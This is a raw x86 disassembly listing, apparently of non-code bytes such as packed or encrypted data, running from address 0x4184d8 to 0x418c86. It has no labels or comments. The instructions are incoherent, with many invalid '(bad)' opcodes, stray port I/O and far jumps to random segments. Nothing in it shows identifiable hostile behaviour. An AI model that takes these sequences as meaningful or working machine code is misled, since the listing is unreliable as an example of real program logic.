  4184d8:	xlat   BYTE PTR ds:[ebx]
  4184d9:	sub    bh,BYTE PTR [ecx+0x61aa421]
  4184df:	sahf   
  4184e0:	ret    
  4184e1:	or     ch,dl
  4184e3:	push   cs
  4184e4:	fdivrp st(5),st
  4184e6:	outs   dx,BYTE PTR ds:[esi]
  4184e7:	push   0x1b
  4184e9:	lock daa 
  4184eb:	retf   
  4184ec:	scas   eax,DWORD PTR es:[edi]
  4184ed:	js     0x4184d1
  4184ef:	fiadd  WORD PTR [edi+0x49]
  4184f2:	sbb    DWORD PTR [ebp+0x3ef013e0],0x526d6b09
  4184fc:	mov    WORD PTR [eax-0x11],?
  4184ff:	jb     0x418554
  418501:	mov    bh,0xd4
  418503:	mov    bl,0x4c
  418505:	pop    esp
  418506:	pminsw mm0,mm2
  418509:	aam    0xda
  41850b:	clc    
  41850c:	pusha  
  41850d:	cli    
  41850e:	dec    edi
  41850f:	sbb    eax,0x60916a6d
  418514:	nop
  418515:	jbe    0x4184e8
  418517:	or     al,0x6a
  418519:	dec    edx
  41851a:	inc    edi
  41851b:	add    DWORD PTR [edi],0xffffffa0
  41851e:	pop    edx
  41851f:	push   cs
  418520:	add    dh,BYTE PTR ds:0x8a63ad06
  418526:	xchg   edx,eax
  418527:	cmp    al,bh
  418529:	jg     0x4184ed
  41852b:	mov    cl,BYTE PTR [eax-0x8]
  41852e:	mov    cs,eax
  418530:	or     DWORD PTR [ecx],eax
  418532:	inc    ebp
  418533:	push   esp
  418534:	mov    al,0xc7
  418536:	sub    DWORD PTR [esi-0x8a928b6],edi
  41853c:	fimul  WORD PTR [ebx]
  41853e:	push   eax
  41853f:	inc    edi
  418540:	mov    ch,0x52
  418542:	or     bl,BYTE PTR [eax-0x35]
  418545:	xor    DWORD PTR [edx-0x5e8b367a],ebx
  41854b:	jno    0x41857f
  41854d:	out    dx,eax
  41854e:	mov    al,ds:0xe7348fb
  418553:	or     cl,BYTE PTR [eax+0x48dba20]
  418559:	out    0x83,eax
  41855b:	pop    ebp
  41855c:	mov    DWORD PTR [eax-0x32364339],edi
  418562:	or     BYTE PTR [ebx+0x59240553],bh
  418568:	daa    
  418569:	and    eax,0xe92659e4
  41856e:	lds    ebx,FWORD PTR [ebp-0x2d]
  418571:	pop    es
  418572:	xchg   DWORD PTR [ecx+0x10aa405a],edi
  418578:	xor    cl,0x13
  41857b:	or     al,0x48
  41857d:	dec    ebp
  41857e:	shrd   DWORD PTR [edi-0x21fdadff],eax,0x42
  418586:	or     al,0x74
  418588:	push   esi
  418589:	xchg   ebp,eax
  41858a:	dec    eax
  41858b:	push   0x51
  41858d:	pop    es
  41858e:	stos   BYTE PTR es:[edi],al
  41858f:	push   eax
  418590:	shl    BYTE PTR ss:[edx],1
  418593:	ret    0x88bc
  418596:	sub    ecx,DWORD PTR [ebx+eiz*1-0x1658d65e]
  41859d:	cs retf 0x7cd5
  4185a1:	sbb    eax,0x89c676c5
  4185a6:	loope  0x418624
  4185a8:	test   al,0xed
  4185aa:	pushf  
  4185ab:	outs   dx,DWORD PTR ds:[esi]
  4185ac:	dec    ebx
  4185ad:	sub    al,0x71
  4185af:	push   eax
  4185b0:	dec    ecx
  4185b1:	mov    bh,0x24
  4185b3:	xchg   BYTE PTR [ecx],bh
  4185b5:	inc    esp
  4185b6:	inc    edi
  4185b7:	add    eax,DWORD PTR [edx-0x25]
  4185ba:	test   al,0x7c
  4185bc:	mov    BYTE PTR [ebx],dl
  4185be:	xchg   DWORD PTR [edi],eax
  4185c0:	lea    ecx,ds:0xb46954b3
  4185c6:	mov    dl,BYTE PTR [ebx+ebx*4-0x20446a9e]
  4185cd:	fs xchg esp,eax
  4185cf:	into   
  4185d0:	into   
  4185d1:	not    DWORD PTR [ebp+0x286a313d]
  4185d7:	imul   esi,DWORD PTR [ebp-0x76],0xc24e063d
  4185de:	inc    edx
  4185df:	test   DWORD PTR [ecx],edi
  4185e1:	pop    ebx
  4185e2:	cmp    DWORD PTR [ebx-0x62694a5e],ebx
  4185e8:	fwait
  4185e9:	xchg   edi,eax
  4185ea:	neg    BYTE PTR [eax+0x3b229dad]
  4185f0:	stc    
  4185f1:	cmc    
  4185f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185f3:	fwait
  4185f4:	adc    al,0x78
  4185f6:	in     eax,0x45
  4185f8:	pop    ss
  4185f9:	sahf   
  4185fa:	(bad)  
  4185fb:	mov    fs,WORD PTR [eax+0x2e88067d]
  418601:	repz je 0x4185b9
  418604:	dec    ecx
  418605:	jecxz  0x418605
  418607:	popa   
  418608:	imul   ebx,DWORD PTR [esi-0x68],0x7d
  41860c:	jo     0x41862e
  41860e:	push   ss
  41860f:	add    DWORD PTR [ecx+0x1bbf9359],esp
  418615:	test   BYTE PTR ds:0x6a53da35,ch
  41861b:	aaa    
  41861c:	adc    BYTE PTR [esi-0x1e],bh
  41861f:	cmp    DWORD PTR [ebx-0x72],ecx
  418622:	push   ecx
  418623:	cmp    al,0xd6
  418625:	or     DWORD PTR [ebx],esp
  418627:	inc    esi
  418628:	or     ebx,eax
  41862a:	pop    edx
  41862b:	in     eax,dx
  41862c:	idiv   DWORD PTR [esi]
  41862e:	fs push ecx
  418630:	in     eax,dx
  418631:	cdq    
  418632:	dec    esi
  418633:	jns    0x418671
  418635:	out    0xbf,eax
  418637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418638:	xor    esp,DWORD PTR [ecx]
  41863a:	mov    esi,0x39d839f1
  41863f:	xlat   BYTE PTR ds:[ebx]
  418640:	(bad)  
  418642:	sbb    ebp,0xa63ac
  418648:	test   DWORD PTR [ebx],ebp
  41864a:	ret    0xee6f
  41864d:	test   dl,dh
  41864f:	inc    edx
  418650:	jno    0x41866c
  418652:	push   ss
  418653:	fwait
  418654:	out    0x79,al
  418656:	sahf   
  418657:	rol    DWORD PTR [ecx],1
  418659:	mov    dl,0xbc
  41865b:	add    edx,DWORD PTR [edx]
  41865d:	and    DWORD PTR [edi-0x1d44500c],eax
  418663:	rol    esp,0x10
  418666:	scas   al,BYTE PTR es:[edi]
  418667:	push   ebp
  418668:	out    0xde,al
  41866a:	pop    eax
  41866b:	push   edi
  41866c:	repz (bad) [ecx-0x6]
  418670:	sti    
  418671:	xchg   BYTE PTR [edi],dl
  418673:	adc    ebp,DWORD PTR ds:0x5078228b
  418679:	xchg   ebp,eax
  41867a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867b:	or     ebp,DWORD PTR ds:0xd7c834b
  418681:	(bad)  
  418682:	adc    edi,DWORD PTR [edi]
  418684:	pop    edx
  418685:	cdq    
  418686:	pusha  
  418687:	or     DWORD PTR [ebp-0x2da7a821],esp
  41868d:	test   al,0x83
  41868f:	and    BYTE PTR [eax],dl
  418691:	mul    DWORD PTR [edi-0x640bd541]
  418697:	push   ds
  418698:	je     0x418636
  41869a:	jbe    0x4186c4
  41869c:	cmp    eax,DWORD PTR [edx+0x39]
  41869f:	loop   0x41869a
  4186a1:	out    0x65,eax
  4186a3:	add    DWORD PTR [eax],esi
  4186a5:	bound  eax,QWORD PTR [ebx+0x62]
  4186a8:	loop   0x4186a0
  4186aa:	inc    ecx
  4186ab:	push   edx
  4186ac:	add    esp,esi
  4186ae:	cwde   
  4186af:	mov    fs,WORD PTR [eax+0x4d]
  4186b2:	or     BYTE PTR [esi-0x70],ah
  4186b5:	dec    ebp
  4186b6:	add    esp,DWORD PTR [ecx]
  4186b8:	sahf   
  4186b9:	mov    edi,0x4fecf9df
  4186be:	xor    al,0x67
  4186c0:	adc    BYTE PTR ds:0x247e03c8,0xfc
  4186c7:	sub    eax,0xf14e5fc0
  4186cc:	adc    bl,ch
  4186ce:	std    
  4186cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186d0:	call   0xe34c:0x7d394c12
  4186d7:	(bad)  
  4186d9:	stos   DWORD PTR es:[edi],eax
  4186da:	pop    edx
  4186db:	(bad)  
  4186dc:	adc    eax,0x69bc7462
  4186e1:	jmp    0xd462f7b8
  4186e6:	clc    
  4186e7:	mov    esp,0x76980a51
  4186ec:	pop    ds
  4186ed:	and    al,0x84
  4186ef:	mov    ebx,0xa7e7761e
  4186f4:	or     DWORD PTR [eax+edx*4],0xaf5c2057
  4186fb:	iret   
  4186fc:	imul   ebx,DWORD PTR [ecx+edi*2-0x5a],0xcc50abcf
  418704:	daa    
  418705:	mov    eax,ds:0xa24d5196
  41870a:	add    eax,DWORD PTR [esi+0x3]
  41870d:	scas   eax,DWORD PTR es:[edi]
  41870e:	push   0x69
  418710:	ret    0xb9a6
  418713:	mov    ds:0xf4bf615b,al
  418718:	jp     0x418723
  41871a:	addr16 rcr cl,1
  41871d:	adc    dh,BYTE PTR [edi+0x32f49ea7]
  418723:	dec    eax
  418724:	pop    eax
  418725:	jbe    0x4186b8
  418727:	imul   ecx,ecx,0xa64a341
  41872d:	mov    ebx,0xafbbf313
  418732:	aam    0xd5
  418734:	mov    es,WORD PTR [ecx]
  418736:	icebp  
  418737:	cli    
  418738:	icebp  
  418739:	arpl   bp,dx
  41873b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41873c:	dec    edx
  41873d:	iret   
  41873e:	mov    bl,0x11
  418740:	mov    gs,WORD PTR [esi]
  418742:	cmp    DWORD PTR [ebp+eax*4-0x4f9cd4c0],ecx
  418749:	in     eax,dx
  41874a:	xor    ebp,ebx
  41874c:	pop    edx
  41874d:	dec    esp
  41874e:	int    0xa1
  418750:	ins    DWORD PTR es:[edi],dx
  418751:	mov    bh,0x27
  418753:	xor    BYTE PTR [edx],bh
  418755:	pushf  
  418756:	mov    eax,0x5f6d5a4
  41875b:	xchg   esi,eax
  41875c:	push   es
  41875d:	sub    al,0x1b
  41875f:	(bad)  
  418761:	retf   0xc4cd
  418764:	sbb    bl,BYTE PTR [edx+0x3a04a471]
  41876a:	mov    dh,0xb9
  41876c:	leave  
  41876d:	push   cs
  41876e:	lds    ecx,FWORD PTR [ebx-0x5bd4851a]
  418774:	(bad)  
  418776:	xchg   esp,eax
  418777:	or     eax,0xbb632504
  41877c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41877d:	int3   
  41877e:	ja     0x418769
  418780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418781:	push   ss
  418782:	xor    al,0x27
  418784:	xlat   BYTE PTR ds:[ebx]
  418785:	mov    DWORD PTR [ecx-0x54fed3d3],edx
  41878b:	retf   
  41878c:	stc    
  41878d:	xchg   ebp,eax
  41878e:	push   ss
  41878f:	inc    esp
  418790:	test   BYTE PTR [edx],dh
  418792:	ins    DWORD PTR es:[edi],dx
  418793:	mov    ecx,0xc4b0d261
  418798:	cmp    al,0x45
  41879a:	mov    bh,0xc9
  41879c:	mov    dl,0xd6
  41879e:	mov    al,0x1b
  4187a0:	psubusb mm6,QWORD PTR [ebp-0x5a]
  4187a4:	fisubr WORD PTR [ebx-0x2bed217e]
  4187aa:	jmp    0xb4811e44
  4187af:	and    al,0x35
  4187b1:	(bad)  
  4187b3:	cmp    esp,DWORD PTR [ecx-0x37cbe0a9]
  4187b9:	and    BYTE PTR [esi],0x11
  4187bc:	loopne 0x41877e
  4187be:	daa    
  4187bf:	pop    ds
  4187c0:	ror    cl,cl
  4187c2:	inc    edx
  4187c3:	pop    ebp
  4187c4:	add    esi,DWORD PTR ds:0xff09d147
  4187ca:	and    al,0x63
  4187cc:	test   BYTE PTR [edi+0x3c],0x11
  4187d0:	mov    ebx,0xad8863c1
  4187d5:	scas   al,BYTE PTR es:[edi]
  4187d6:	jle    0x4187ce
  4187d8:	pop    ecx
  4187d9:	push   esi
  4187da:	aaa    
  4187db:	aad    0x3e
  4187dd:	outs   dx,BYTE PTR ds:[esi]
  4187de:	mov    dh,0x94
  4187e0:	jl     0x4187a5
  4187e2:	leave  
  4187e3:	lods   al,BYTE PTR ds:[esi]
  4187e4:	ja     0x41885e
  4187e6:	mov    esi,0xe7682a88
  4187eb:	gs push esp
  4187ed:	scas   al,BYTE PTR es:[edi]
  4187ee:	aaa    
  4187ef:	dec    eax
  4187f0:	stc    
  4187f1:	fs call 0xef0:0xc15e46c9
  4187f9:	js     0x4187c0
  4187fb:	xchg   edi,eax
  4187fc:	xor    BYTE PTR [esi-0xb],bh
  4187ff:	xchg   esi,eax
  418800:	lahf   
  418801:	fst    QWORD PTR [ebx*1+0x4cfda528]
  418808:	in     eax,dx
  418809:	out    dx,eax
  41880a:	(bad)  
  41880b:	out    0xd3,eax
  41880d:	in     al,dx
  41880e:	int3   
  41880f:	or     BYTE PTR [ebx+0x57],0xa0
  418813:	adc    edi,DWORD PTR [ebx-0x36cf516b]
  418819:	push   ebx
  41881a:	in     al,0xf8
  41881c:	xchg   ebx,eax
  41881d:	mov    al,ds:0x235d3b00
  418822:	mov    cl,BYTE PTR [esi+0x5f2706c3]
  418828:	push   ecx
  418829:	cmp    edi,ecx
  41882b:	xchg   esp,eax
  41882c:	sub    BYTE PTR [ecx-0x4],ch
  41882f:	in     al,dx
  418830:	xor    BYTE PTR [ecx-0x438c76ca],bl
  418836:	add    al,0xdd
  418838:	(bad)  
  418839:	sbb    edx,DWORD PTR [esi]
  41883b:	mov    ebp,DWORD PTR [edi]
  41883d:	retf   0x3c09
  418840:	add    DWORD PTR [ebx+0x65],esp
  418843:	jne    0x41884a
  418845:	daa    
  418846:	fstp   QWORD PTR [edi-0x1e]
  418849:	idiv   DWORD PTR [ebx-0x52]
  41884c:	rcr    DWORD PTR [ecx+0x773e9b74],cl
  418852:	scas   eax,DWORD PTR es:[edi]
  418853:	sbb    BYTE PTR [edx-0x3f],cl
  418856:	pop    es
  418857:	sub    BYTE PTR ds:0x1a3635e5,cl
  41885d:	mov    bh,0xe4
  41885f:	sub    al,0xe2
  418861:	cmc    
  418862:	rcl    eax,cl
  418864:	push   eax
  418865:	sub    eax,0x96a92476
  41886a:	jmp    0x418854
  41886c:	pop    ebx
  41886d:	adc    ch,BYTE PTR [ebx+0x2daa9e13]
  418873:	out    dx,al
  418874:	pop    edi
  418875:	sub    al,0x9f
  418877:	mov    esi,0x53ec24f7
  41887c:	or     al,0x13
  41887e:	jno    0x41880c
  418880:	fnstsw WORD PTR [ebx]
  418882:	push   ebx
  418883:	push   cs
  418884:	iret   
  418885:	sub    esp,DWORD PTR [ecx+eiz*8]
  418888:	mov    bl,0x4b
  41888a:	or     al,0xbc
  41888c:	rol    BYTE PTR [ecx+0x6e5b6e02],cl
  418892:	icebp  
  418893:	fsub   DWORD PTR [ebp-0x3]
  418896:	jmp    0x4188fc
  418898:	dec    ebx
  418899:	mov    bh,0xd0
  41889b:	adc    bl,BYTE PTR [eax+0x8]
  41889e:	popf   
  41889f:	jmp    0x4188e4
  4188a1:	xchg   ebp,eax
  4188a2:	cli    
  4188a3:	pop    ebp
  4188a4:	or     dl,BYTE PTR [edx+0xc]
  4188a7:	in     al,0xe4
  4188a9:	or     esi,ecx
  4188ab:	cli    
  4188ac:	pop    ebp
  4188ad:	or     ebx,esi
  4188af:	fdivp  st(7),st
  4188b1:	inc    esp
  4188b2:	mov    dh,0x76
  4188b4:	scas   al,BYTE PTR es:[edi]
  4188b5:	mov    ds:0x989b02c3,al
  4188ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188bb:	xor    al,0x41
  4188bd:	mov    ds:0xc7d8a38b,eax
  4188c2:	in     eax,0x26
  4188c4:	aaa    
  4188c5:	ss ret 0xdf49
  4188c9:	sets   BYTE PTR [ebx]
  4188cc:	jmp    DWORD PTR [edx+0x6942fbf3]
  4188d2:	mov    eax,esi
  4188d4:	mov    bh,0x4e
  4188d6:	jmp    0xb886:0xc3aea1e3
  4188dd:	mov    eax,DWORD PTR [esi+0x35]
  4188e0:	dec    ebx
  4188e1:	mov    ch,0x93
  4188e3:	ffree  st(1)
  4188e5:	lahf   
  4188e6:	(bad)  
  4188e7:	fadd   DWORD PTR [eax+0x4d6be2d2]
  4188ed:	lock lods al,BYTE PTR ds:[esi]
  4188ef:	jle    0x41893e
  4188f1:	aam    0x90
  4188f3:	mov    ds:0xc2f87b04,al
  4188f8:	mov    bl,0x8c
  4188fa:	xor    DWORD PTR ds:0xc16bc1de,0x9c962546
  418904:	(bad)  
  418905:	stos   DWORD PTR es:[edi],eax
  418906:	mov    bl,0x46
  418908:	out    dx,eax
  418909:	not    DWORD PTR [ecx]
  41890b:	xchg   BYTE PTR ds:0xd69348ca,bl
  418911:	cmp    eax,0x52bfb168
  418916:	rol    BYTE PTR [edx],0xf6
  418919:	cmp    DWORD PTR [ecx+0x18],edi
  41891c:	cmp    DWORD PTR [eax+esi*4],edx
  41891f:	add    eax,0xba916c7b
  418924:	push   0xffffff90
  418926:	xlat   BYTE PTR ds:[ebx]
  418927:	ss add eax,0x7142869d
  41892d:	lahf   
  41892e:	mov    cl,0x31
  418930:	adc    esp,DWORD PTR [ebp+0x4bbf064c]
  418936:	ret    
  418937:	mov    ah,0x39
  418939:	xchg   BYTE PTR [ecx],bl
  41893b:	jge    0x4188e6
  41893d:	mov    BYTE PTR [eax],bl
  41893f:	or     DWORD PTR [eax-0x282f704f],ecx
  418945:	cmp    eax,0x5f72973c
  41894a:	out    0x84,al
  41894c:	dec    ebx
  41894d:	push   0xffffffc7
  41894f:	pop    ecx
  418950:	shl    BYTE PTR [edi],1
  418952:	xor    edi,DWORD PTR [ecx+0x5b]
  418955:	add    al,cl
  418957:	sub    ebp,DWORD PTR [ebp+0x7d76df5b]
  41895d:	jae    0x418904
  41895f:	and    DWORD PTR [edi-0x2cdb4ea1],0xffffffe6
  418966:	out    dx,eax
  418967:	repz push edi
  418969:	cmp    eax,0x24cc1ec7
  41896e:	(bad)  
  41896f:	xlat   BYTE PTR ds:[ebx]
  418970:	ss pop ds
  418972:	lahf   
  418973:	aad    0x52
  418975:	jae    0x41897e
  418977:	enter  0x3563,0xde
  41897b:	dec    edi
  41897c:	add    eax,0x20c06d8e
  418981:	shl    BYTE PTR [edx+0x1bb414e9],1
  418987:	std    
  418988:	fimul  WORD PTR [ebp+0x509c3184]
  41898e:	sbb    cl,BYTE PTR [edi+0x43]
  418991:	lahf   
  418992:	cmc    
  418993:	hlt    
  418994:	sti    
  418995:	jo     0x4189a8
  418997:	(bad)  
  418999:	sub    BYTE PTR [eax],dl
  41899b:	out    0xc8,al
  41899d:	ret    0xe0e3
  4189a0:	je     0x41894c
  4189a2:	sub    bh,BYTE PTR [ebx]
  4189a4:	je     0x4189e2
  4189a6:	fwait
  4189a7:	das    
  4189a8:	xor    eax,DWORD PTR [edx-0x659af300]
  4189ae:	fld    QWORD PTR [ebx]
  4189b0:	lds    ebx,FWORD PTR [edx+0x603bf929]
  4189b6:	xchg   edi,edx
  4189b8:	stc    
  4189b9:	mov    DWORD PTR [esi],ebp
  4189bb:	xchg   ecx,eax
  4189bc:	sbb    eax,0xf3c3af19
  4189c1:	outs   dx,BYTE PTR ds:[esi]
  4189c2:	xchg   edx,eax
  4189c3:	add    BYTE PTR [ebx],cl
  4189c5:	retf   0xff18
  4189c8:	es xchg ebx,eax
  4189ca:	sti    
  4189cb:	sub    al,0x3c
  4189cd:	sub    DWORD PTR [esp+esi*2+0x10],edi
  4189d1:	(bad)  
  4189d2:	fstp   DWORD PTR [ecx]
  4189d4:	(bad)  
  4189d5:	mov    bl,0x5d
  4189d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d8:	test   DWORD PTR [eax-0x21fb8f9f],ebx
  4189de:	xchg   ebx,eax
  4189df:	loopne 0x4189de
  4189e1:	jl     0x4189b4
  4189e3:	dec    ecx
  4189e4:	pop    esi
  4189e5:	inc    edi
  4189e6:	or     ebx,DWORD PTR [edx+0x20]
  4189e9:	sbb    DWORD PTR [ecx],esp
  4189eb:	mov    bh,0x17
  4189ed:	xor    ecx,DWORD PTR [ebp+0x1f]
  4189f0:	jno    0x418a3e
  4189f2:	adc    BYTE PTR [edx+0xc],dh
  4189f5:	loopne 0x418a25
  4189f7:	xor    BYTE PTR [eax],cl
  4189f9:	cmp    al,0xbd
  4189fb:	inc    eax
  4189fc:	dec    ebp
  4189fd:	es sahf 
  4189ff:	pop    eax
  418a00:	jecxz  0x418a47
  418a02:	dec    ebp
  418a03:	(bad)  
  418a04:	sti    
  418a05:	aas    
  418a06:	inc    edi
  418a07:	sbb    BYTE PTR [edi-0x72f0c567],al
  418a0d:	push   0x2e673336
  418a12:	push   edi
  418a13:	xor    DWORD PTR [ebp+esi*2-0x2dd6c634],0x4d
  418a1b:	dec    ecx
  418a1c:	(bad)  
  418a1d:	out    0xa9,eax
  418a1f:	fcom   QWORD PTR [edx+ebp*1-0x51]
  418a23:	out    dx,eax
  418a24:	pop    eax
  418a25:	into   
  418a26:	(bad)  
  418a27:	in     al,0x65
  418a29:	int3   
  418a2a:	sub    ah,BYTE PTR [ecx]
  418a2c:	xor    esi,ebp
  418a2e:	ds inc ebp
  418a30:	cmp    al,0xe2
  418a32:	or     DWORD PTR [edi+0x2f59e484],ebp
  418a38:	mov    ecx,0x5b7ad08a
  418a3d:	xchg   ecx,eax
  418a3e:	jno    0x418a3a
  418a40:	shl    dh,1
  418a42:	fstp   DWORD PTR [edi+0x75]
  418a45:	in     al,0xe6
  418a47:	call   0xd2ac:0xfeb8a52e
  418a4e:	sbb    ecx,DWORD PTR [eax+0x76381e0b]
  418a54:	shr    BYTE PTR [ebx-0x1d],cl
  418a57:	test   edi,edx
  418a59:	mov    ecx,0xa48295cf
  418a5e:	inc    eax
  418a5f:	xchg   DWORD PTR [eax-0x1],esi
  418a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a63:	and    edi,DWORD PTR [edi+0x52]
  418a66:	pop    ecx
  418a67:	in     al,0x2
  418a69:	call   0xeb54a0f5
  418a6e:	int3   
  418a6f:	pop    esp
  418a70:	sub    al,0xb9
  418a72:	sbb    edx,esi
  418a74:	and    esi,DWORD PTR [edx+ecx*2+0x21310640]
  418a7b:	push   ds
  418a7c:	lea    ecx,[ebp+0x32]
  418a7f:	ret    
  418a80:	cmc    
  418a81:	test   BYTE PTR [ecx-0x77545083],0x25
  418a88:	pop    eax
  418a89:	sahf   
  418a8a:	mov    eax,ds:0x92f60fec
  418a8f:	ss nop
  418a91:	jae    0x418a99
  418a93:	dec    eax
  418a94:	mov    DWORD PTR [ecx-0x7d],edi
  418a97:	mov    edx,0x318e6e2f
  418a9c:	(bad)  
  418a9d:	xor    ecx,DWORD PTR [edx-0x47014159]
  418aa3:	iret   
  418aa4:	repnz inc eax
  418aa6:	dec    esp
  418aa7:	or     esp,ebp
  418aa9:	mov    cs,WORD PTR [edi]
  418aab:	inc    eax
  418aac:	xchg   DWORD PTR [ebx-0x6b],ebx
  418aaf:	lahf   
  418ab0:	and    DWORD PTR [eax],edx
  418ab2:	push   eax
  418ab3:	jecxz  0x418aea
  418ab5:	xchg   esp,eax
  418ab6:	and    cl,BYTE PTR [edx+0x3e]
  418ab9:	mov    dl,0x5
  418abb:	push   es
  418abc:	jne    0x418b1c
  418abe:	pop    ecx
  418abf:	fwait
  418ac0:	sbb    cl,BYTE PTR [edx+esi*8+0x6bd67f40]
  418ac7:	mov    ah,0x56
  418ac9:	retf   
  418aca:	mov    esi,0x4963cd06
  418acf:	sbb    al,0xfb
  418ad1:	jmp    0xe01b589b
  418ad6:	clc    
  418ad7:	ror    DWORD PTR [ebp-0x4b],1
  418ada:	mov    ds:0xe1710114,al
  418adf:	loope  0x418a9f
  418ae1:	pushf  
  418ae2:	test   DWORD PTR [edx-0x4],edi
  418ae5:	dec    BYTE PTR [ebx+0x12]
  418ae8:	int    0x66
  418aea:	in     al,dx
  418aeb:	cdq    
  418aec:	in     eax,dx
  418aed:	sti    
  418aee:	lea    eax,[edi+0x1cc72412]
  418af4:	push   esi
  418af5:	pop    ebx
  418af6:	pop    es
  418af7:	jb     0x418ae3
  418af9:	into   
  418afa:	enter  0xf36f,0x6b
  418afe:	lds    edx,FWORD PTR [edx-0x820f0b6]
  418b04:	fiadd  WORD PTR [ebp-0x76c0bb4c]
  418b0a:	or     ah,dh
  418b0c:	in     eax,0x9
  418b0e:	cmp    DWORD PTR [esi-0x7f],esp
  418b11:	jb     0x418aaa
  418b13:	push   ecx
  418b14:	lds    ebx,FWORD PTR [edi-0x164e2761]
  418b1a:	sbb    eax,0xbd554e9
  418b1f:	jne    0x418b2b
  418b21:	jp     0x418ba0
  418b23:	mov    ds:0x70e1a1ae,eax
  418b28:	fst    DWORD PTR [edi+eiz*1-0x766e709f]
  418b2f:	scas   eax,DWORD PTR es:[edi]
  418b30:	js     0x418b87
  418b32:	sbb    ecx,DWORD PTR [edx-0x38]
  418b35:	mov    ecx,0x79035b8
  418b3a:	not    DWORD PTR [ecx+edi*1-0x72e810ad]
  418b41:	nop
  418b42:	or     ebp,ebx
  418b44:	push   es
  418b45:	jp     0x418b9f
  418b47:	mov    bl,0x74
  418b49:	push   0x4f8bcda5
  418b4e:	sub    eax,0x5b8da81f
  418b53:	(bad)  
  418b54:	xor    ch,dl
  418b56:	jmp    0x93f0:0xf7220661
  418b5d:	arpl   WORD PTR [esi],sp
  418b5f:	cld    
  418b60:	out    dx,al
  418b61:	fldenv [ecx+0x325d032d]
  418b67:	inc    ebp
  418b68:	into   
  418b69:	lahf   
  418b6a:	adc    DWORD PTR [ecx+0xa],edx
  418b6d:	pop    es
  418b6e:	mov    DWORD PTR [edi],ebx
  418b70:	arpl   WORD PTR [eax-0x1c],dx
  418b73:	mov    ebx,0x726484b3
  418b78:	push   ebx
  418b79:	(bad)  
  418b7a:	div    DWORD PTR [eax-0x73]
  418b7d:	lock fmulp st(4),st
  418b80:	inc    esp
  418b81:	stos   DWORD PTR es:[edi],eax
  418b82:	cdq    
  418b83:	stos   DWORD PTR es:[edi],eax
  418b84:	lods   eax,DWORD PTR fs:[esi]
  418b86:	mov    edi,es
  418b88:	mov    gs,ecx
  418b8a:	std    
  418b8b:	pop    ecx
  418b8c:	push   0xffffff88
  418b8e:	pushf  
  418b8f:	push   ecx
  418b90:	repnz (bad) 
  418b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b93:	xor    dh,bh
  418b95:	iret   
  418b96:	jo     0x418bae
  418b98:	sbb    eax,0x5023a483
  418b9d:	adc    BYTE PTR [ebp+0x4],0x8b
  418ba1:	in     al,0xe3
  418ba3:	vpaddusb xmm3,xmm4,XMMWORD PTR [esi-0x2]
  418ba8:	int3   
  418ba9:	enter  0xe249,0x61
  418bad:	gs icebp 
  418baf:	jg     0x418b49
  418bb1:	and    al,bl
  418bb3:	xor    edi,DWORD PTR [ebx+eiz*1-0x6b39b0a7]
  418bba:	fisubr WORD PTR [edx+ebx*4+0x5d]
  418bbe:	push   edi
  418bbf:	inc    ecx
  418bc0:	pop    esp
  418bc1:	and    BYTE PTR ds:0x5e70ddb6,dh
  418bc7:	or     dl,BYTE PTR [edi-0x1f]
  418bca:	call   0x5cd1:0x3b00a836
  418bd1:	mov    ah,0x3f
  418bd3:	bound  ebp,QWORD PTR [ecx-0x7]
  418bd6:	and    DWORD PTR [edi+0x7b],ebx
  418bd9:	ins    DWORD PTR es:[edi],dx
  418bda:	push   ss
  418bdb:	call   0x94ba:0xbef36132
  418be2:	mov    dh,0x1e
  418be4:	xchg   ebp,eax
  418be5:	cli    
  418be6:	xchg   DWORD PTR [ecx-0x2c8f04f5],ebx
  418bec:	mov    edi,0x5da36727
  418bf1:	inc    eax
  418bf2:	test   eax,0xe4185d52
  418bf7:	mov    ch,0x14
  418bf9:	sbb    ecx,ebx
  418bfb:	shl    BYTE PTR [esi+edx*4+0x1d],1
  418bff:	data16 sbb ah,BYTE PTR [eax]
  418c02:	aad    0x66
  418c04:	idiv   DWORD PTR [ebx+0x1c7abdc2]
  418c0a:	adc    eax,0x7a5a273e
  418c0f:	add    BYTE PTR [edx],dh
  418c11:	pop    esi
  418c12:	dec    esp
  418c13:	rcr    DWORD PTR [esi+0x611f32a6],cl
  418c19:	xor    DWORD PTR [eax],0x65e3e484
  418c1f:	cmp    DWORD PTR [eax-0xa41d554],ecx
  418c25:	cld    
  418c26:	ret    
  418c27:	jbe    0x418c7e
  418c29:	das    
  418c2a:	mov    esi,0xde5dc1c1
  418c2f:	jmp    0x75cfeaf0
  418c34:	add    BYTE PTR [ecx],0x60
  418c37:	mov    bl,0xb9
  418c39:	and    eax,0xe242ec13
  418c3e:	out    0x71,eax
  418c40:	jns    0x418c13
  418c42:	jno    0x418c24
  418c44:	mov    eax,0xe0c8d57c
  418c49:	mov    ecx,0x1a39da4b
  418c4e:	jp     0x418cb8
  418c50:	aas    
  418c51:	(bad)  [edx]
  418c53:	inc    edi
  418c54:	push   0x44
  418c56:	(bad)  
  418c57:	jg     0x418bfe
  418c59:	stc    
  418c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c5b:	adc    al,0x8d
  418c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c5e:	mov    edi,0x8f354f9b
  418c63:	pusha  
  418c64:	loope  0x418caf
  418c66:	lods   eax,DWORD PTR ds:[esi]
  418c67:	ins    DWORD PTR es:[edi],dx
  418c68:	dec    esi
  418c69:	call   0xbac0:0x35ff24fe
  418c70:	sbb    edx,esp
  418c72:	jno    0x418cd6
  418c74:	fisub  WORD PTR [edx+ecx*8-0x69]
  418c78:	and    BYTE PTR [ecx+0x7d7f0c8e],dh
  418c7e:	inc    esi
  418c7f:	adc    BYTE PTR [eax-0x4b],0x62
  418c83:	js     0x418ca2
  418c85:	inc    esp
  418c86:	mov    eax,ds:0x4cfde5ac
